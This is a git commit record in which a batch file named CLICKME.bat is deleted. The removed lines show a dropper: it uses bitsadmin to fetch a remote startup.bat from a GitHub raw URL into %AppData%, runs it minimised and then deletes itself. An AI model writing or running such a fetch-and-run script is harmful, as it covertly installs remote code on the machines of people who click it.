8f8f98bc9830e06af931fba7bc6a3e071617dcc6
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 23:40:06 +0800

    Delete CLICKME.bat

--- CLICKME.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/startup.bat" "%AppData%\startup.bat"
-start /min %AppData%\startup.bat
-del CLICKME.bat
